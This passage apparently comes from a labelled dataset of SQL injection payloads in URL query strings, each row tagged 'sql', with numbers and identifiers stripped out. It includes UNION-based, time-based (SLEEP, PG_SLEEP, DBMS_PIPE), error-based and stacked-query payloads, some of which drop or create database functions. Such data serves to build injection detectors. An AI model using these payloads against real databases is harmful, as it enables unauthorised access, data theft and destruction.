3385,sql,". . . . ? =   "" ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " nxju " = " "
3386,sql,". . . . / / / / ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3387,sql,". . / / / ? = & = & = & =   % ' ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
3388,sql,". . . / ? = & =  - ' ) ) UNION ALL SELECT , , , , ,  -- "
3389,sql,". . . . / / / / ? = & =   ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( = "
3390,sql,". . . / ? = & = & =   ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( = "
3391,sql,". . / / / ? =   ) ) ) RLIKE SLEEP ( ) AND ( ( ( = "
3392,sql,". . . / / / ? = & = & = & =   ) AND = % "
3393,sql,". . . / ? =   ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( = "
3394,sql,". . . / / / / ? =  - % "" UNION ALL SELECT , ,  -- "
3395,sql,". . / / / / ? = & = & =  - ) UNION ALL SELECT , , , , , , # "
3396,sql,". . / / / ? = & = & =   ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , )  -- "
3397,sql,". . . . ? = & =   % ' ) ORDER BY # "
3398,sql,". . / / ? = & =   ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( = "
3399,sql,". . / / / / ? = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN ( SELECT  FROM PG_SLEEP ( ) ) ELSE / ( SELECT ) END ) )  -- "
3400,sql,". . . . / / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3401,sql,". . . / / ? = & = & = & =   ' ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' JomF ' LIKE ' "
3402,sql,". . . . / / / ? = & = & = & =   "" ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ( ( " Rqel " = " "
3403,sql,". . . . / / ? = & = & =   "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " ttMz " = " "
3404,sql,". . . . / / / ? = & =   ( SELECT CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) FROM DUAL ) "
3405,sql,". . / / / / ? = & = & = & =   ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( = "
3406,sql,". . / / / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3407,sql,". . . . / / / ? = & =   % ' ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
3408,sql,". . . / / / ? = & = & = & =   AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' )  -- "
3409,sql,". . / ? = & =   % ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( ( ' % ' = ' "
3410,sql,". . . ? = & =   % ' ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3411,sql,". . . / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3412,sql,". . . . / ? =  - ) UNION ALL SELECT , , , , , , , , ,  -- "
3413,sql,". . . . / / ? = & =   ' ) AND = AND ( ' lAOS ' LIKE ' "
3414,sql,". . . . / ? = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3415,sql,". . . / ? =  - ' ) UNION ALL SELECT , , ,  -- "
3416,sql,". . ? = & = & = & =   "" UNION ALL SELECT NULL # "
3417,sql,". . . . / / ? =   ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( = "
3418,sql,". . . / / / / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3419,sql,". . . . / / / / ? =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3420,sql,". . . . / / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3421,sql,". . . . / / ? = & = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' fvbk ' LIKE ' "
3422,sql,". . . . ? = & = & =   ' ) ) ) ; SELECT SLEEP ( ) # "
3423,sql,". . ? =   % ' ) ORDER BY # "
3424,sql,". . . . ? = & =   "" ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( " NfnU " = " "
3425,sql,". . . . ? = & =   ' ) UNION ALL SELECT NULL , NULL -- "
3426,sql,". . / / ? = & = & = & =   ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' zOLz ' = ' "
3427,sql,". . . / / / ? = & =   % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3428,sql,". . . / / ? = & = & =   "" AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND " zzkl " = " "
3429,sql,". . ? = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3430,sql,". . / / / ? = & =   "" ) AND =  -- "
3431,sql,". . . / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL -- "
3432,sql,". . . . / / ? = & = & =   ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' DnIL ' = ' "
3433,sql,". . . . ? =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3434,sql,". . . / ? =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3435,sql,". . / / / / ? =  - ' ) ) ) UNION ALL SELECT , , , , , , , , ,  -- "
3436,sql,". . / / / / ? = & = & =   % ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' % ' = ' "
3437,sql,". . / / / ? = & =   "" ) ORDER BY  -- "
3438,sql,". . / / / / ? = & = & =   ' ) AND = AND ( ' lAOS ' LIKE ' "
3439,sql,". . / / / / ? =  - "" UNION ALL SELECT , , , , , ,  -- "
3440,sql,". . . / / ? =   ' ) ) ; SELECT SLEEP ( ) AND ( ( ' lysg ' = ' "
3441,sql,". . . . ? = & = & =   ' ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ' ZnAL ' = ' "
3442,sql,". . / / / ? =   "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " eBlz " = " "
3443,sql,". . . / / ? = & =   ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION NZuj --"
3444,sql,". . . / / / ? = & =  - % ' ORDER BY # "
3445,sql,". . . . ? = & = & =   "" ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
3446,sql,". . . / / ? =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL )  -- "
3447,sql,". . ? =   ' ) AND = AND ( ' tYov ' LIKE ' "
3448,sql,". . . . / / / ? = & =  - ' ) UNION ALL SELECT , , ,  -- "
3449,sql,". . . . / ? = & = & = & =   "" ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " izbh " = " "
3450,sql,". . / / / / ? = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ' obOb ' = ' "
3451,sql,". . / ? = & =   "" AND = AND " eaFR " = " "
3452,sql,". . / / / ? = & = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( = "
3453,sql,". . . ? = & = & =   "" ) ) ; SELECT SLEEP ( ) # "
3454,sql,". . . / / / ? = & = & =   ' ) ) ) AND = % "
3455,sql,". . . . / / / ? = & = & = & =   ) ) ) ; SELECT SLEEP ( ) AND ( ( ( = "
3456,sql,". . . ? = & = & = & =   "" AND = # "
3457,sql,". . . . / / / / ? = & =   ' ) ) AND =  -- "
3458,sql,". . / / / ? = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3459,sql,". . . / / ? = & = & = & =   ' ) ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ( ' zPIP ' = ' "
3460,sql,". . ? =  - "" ) ) UNION ALL SELECT , , ,  -- "
3461,sql,". . . / / / ? = & = & = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3462,sql,". . . . ? = & = & =   "" ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( " RFTv " LIKE " "
3463,sql,". . . / / / / ? = & = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3464,sql,". . . . / / / ? =   ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' cbJM ' = ' "
3465,sql,". . . / / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL # "
3466,sql,". . . . / / / ? =   "" ) AND =  -- "
3467,sql,". . . ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3468,sql,". . ? = & = & =   ( CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) ) "
3469,sql,". . . ? =   ) UNION ALL SELECT NULL -- "
3470,sql,". . . . ? = & = & = & =   ' AND MAKE_SET ( = , ) AND ' xujQ ' LIKE ' "
3471,sql,". . / / ? = & =   AND =  -- "
3472,sql,". . . . / / ? =    AND = "
3473,sql,". . . . / ? = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  UNION ALL SELECT ) END ) ) "
3474,sql,". . ? = & = & = & =   ' ) ) ; SELECT SLEEP ( ) AND ( ( ' IBiJ ' LIKE ' "
3475,sql,". . . . / ? = & =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( " zvvV " = " "
3476,sql,". . / / ? =   ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' PlxG ' LIKE ' "
3477,sql,". . . / / ? = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL ) "
3478,sql,". . . / / ? = & =   % "" AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND " % " = " "
3479,sql,". . . / ? = & = & = & =   % ' ) AND = # "
3480,sql,". . / / / ? = & = & =  - % ' UNION ALL SELECT , , , , ,  -- "
3481,sql,". . / / / / ? =   "" ) ) ORDER BY # "
3482,sql,". . . / / / ? = & =  - ) ) UNION ALL SELECT , , , # "
3483,sql,". . . . / / / / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL -- "
3484,sql,". . / / ? = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3485,sql,". . . . ? =   % "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " % " = " "
3486,sql,". . . / / / ? = & = & =  - ' UNION ALL SELECT , , , , , , , , ,  -- "
3487,sql,". . / / / ? = & =   % "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " % " = " "
3488,sql,". . ? = & = & = & =   % ' AND = # "
3489,sql,". . . / / / ? = & = & = & =   "" ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( " wWez " = " "
3490,sql,". . . / ? = & = & = & =   ) ) ) AND = % "
3491,sql,". . . ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3492,sql,". . / ? = & = & =   ' AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
3493,sql,". . / / / ? =   ' ) ) ) AND = AND ( ( ( ' ZDQA ' = ' "
3494,sql,". . . . / / / ? =  - ) UNION ALL SELECT , , , , , , , ,  -- "
3495,sql,". . . . / / / ? = & = & =  - ' UNION ALL SELECT , , , , , , ,  -- "
3496,sql,". . . / / / / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3497,sql,". . . . / / / ? = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3498,sql,". . . . / / / / ? = & =   "" AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND " AqOo " LIKE " "
3499,sql,". . . / / ? = & =   % "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " % " = " "
3500,sql,". . . ? = & = & = & =   AND ELT ( = , SLEEP ( ) ) "
3501,sql,". . / / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3502,sql,". . . . / / / ? = & = & =   % ' ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' % ' = ' "
3503,sql,". . ? =   "" ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( " VZyZ " = " "
3504,sql,". . . / / ? =   ' ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ' eSor ' LIKE ' "
3505,sql,". . . . / / ? = & = & = & =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
3506,sql,". . . . / / / / ? = & =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
3507,sql,". . / / / ? = & =   % ' ) UNION ALL SELECT NULL -- "
3508,sql,". . / / / ? = & = & = & =   % ' ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ' % ' = ' "
3509,sql,". . . . / / / / ? = & =  - ' UNION ALL SELECT , , , , , # "
3510,sql,". . . / ? = & = & = & =   ) ) UNION ALL SELECT NULL # "
3511,sql,". . . / / ? = & =   % "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " % " = " "
3512,sql,". . / / / / ? = & = & =   ' ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( ' Zcrm ' = ' "
3513,sql,". . . . / / / / ? =   "" ) ) ORDER BY  -- "
3514,sql,". . . / / ? = & = & =  - ' ) ) UNION ALL SELECT , , , , , , # "
3515,sql,". . . / / ? = & = & =   ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
3516,sql,". . . / / / ? = & = & =   "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3517,sql,". . . ? = & = & =   AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) # "
3518,sql,". . / ? =   ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ( ' crVC ' = ' "
3519,sql,". . / / / ? = & =   "" ) ) UNION ALL SELECT NULL , NULL # "
3520,sql,". . . / / / / ? =  - ORDER BY # "
3521,sql,". . . . ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3522,sql,". . . / ? = & = & = & =   ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' yvxE ' = ' "
3523,sql,". . / ? = & = & = & =   ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' RPLO ' LIKE ' "
3524,sql,". . . . / / / / ? =   ' ) ; SELECT SLEEP ( ) AND ( ' eGdw ' LIKE ' "
3525,sql,". . . / ? = & =   ' ) ) AND SLEEP ( ) AND ( ( ' CGdY ' = ' "
3526,sql,". . . . / ? = & =   ) ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ( = "
3527,sql,". . . . ? = & =   % ' AND =  -- "
3528,sql,". . . . / / / / ? = & = & = & =  - % ' ) UNION ALL SELECT , , , , , , , ,  -- "
3529,sql,". . / / ? = & = & =   ' ) ) ORDER BY  -- "
3530,sql,". . . . / / / / ? = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3531,sql,". . . / / / ? =   % ' ) ) AND = AND ( ( ' % ' = ' "
3532,sql,". . / ? =   ' ) ) ) ; SELECT SLEEP ( ) AND ( ( ( ' XTLY ' = ' "
3533,sql,". . . / / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) ELSE  END ) FROM DUAL ) "
3534,sql,". . . / / / ? =  - ' UNION ALL SELECT , , ,  -- "
3535,sql,". . ? =   "" ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( " buyI " LIKE " "
3536,sql,". . . / / ? = & = & = & =   % ' UNION ALL SELECT NULL -- "
3537,sql,". . . . / / / ? = & =  - "" ) UNION ALL SELECT , , , , , ,  -- "
3538,sql,". . . . ? = & =   ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
3539,sql,". . / ? = & =   ' ) ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ( ' GeIw ' = ' "
3540,sql,". . . . ? = & = & = & =   ' AND = AND ' CULc ' LIKE ' "
3541,sql,". . . / / / / ? = & =  - ' ORDER BY  -- "
3542,sql,". . . / / / ? = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3543,sql,". . . . ? =   "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " KCKZ " LIKE " "
3544,sql,". . . / / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL # "
3545,sql,". . / ? = & =  - "" ) UNION ALL SELECT , , , , , , , , ,  -- "
3546,sql,". . ? =  - "" ) UNION ALL SELECT , , , , , ,  -- "
3547,sql,". . / ? = & = & =   ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( = "
3548,sql,". . . / / / ? = & =   % ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' % ' = ' "
3549,sql,". . . . ? = & = & = & =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' mEIK ' = ' "
3550,sql,". . . / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3551,sql,". . / / / / ? =  IIF ( = , , / ) "
3552,sql,". . . / / ? = & = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3553,sql,". . . / / / ? = & = & =   ' ) ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
3554,sql,". . . / / / / ? =   AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
3555,sql,". . . / ? =   ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( = "
3556,sql,". . . ? =   ' ) ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
3557,sql,". . / / / ? = & =   ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3558,sql,". . ? = & = & = & =   ( SELECT CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
3559,sql,". . . . / / / ? = & =   ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3560,sql,". . . ? = & = & = & =   "" ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( " ySHb " = " "
3561,sql,". . . / / ? =   ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( = "
3562,sql,". . ? = & = & =  - UNION ALL SELECT # "
3563,sql,". . . ? = & = & =   ' ) ) ) AND SLEEP ( ) AND ( ( ( ' RnOS ' = ' "
3564,sql,". . . / / ? =  - ' UNION ALL SELECT , , , ,  -- "
3565,sql,". . ? = & =   ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
3566,sql,". . / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3567,sql,". . . / / ? =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3568,sql,". . / / ? = & = & = & =  - ' UNION ALL SELECT , , , ,  -- "
3569,sql,". . . / / ? = & = & =   ' UNION ALL SELECT NULL # "
3570,sql,". . / ? = & = & = & =  - ' ) UNION ALL SELECT , , , ,  -- "
3571,sql,". . / / / ? = & = & = & =   ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( = "
3572,sql,". . . . / ? = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
3573,sql,". . ? = & =    AND SLEEP ( ) "
3574,sql,". . / ? = & = & =  - % "" UNION ALL SELECT , , , , , , , , , # "
3575,sql,". . / ? = & =   % ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3576,sql,". . . . / / / ? =   ' ) AND SLEEP ( ) AND ( ' rLaj ' = ' "
3577,sql,". . . . / / / / ? = & =   ) ) AND = % "
3578,sql,". . . . ? = & =  - ' ) UNION ALL SELECT , , , , # "
3579,sql,". . . . / / / / ? = & = & =   ) ) ; SELECT PG_SLEEP ( )  --"
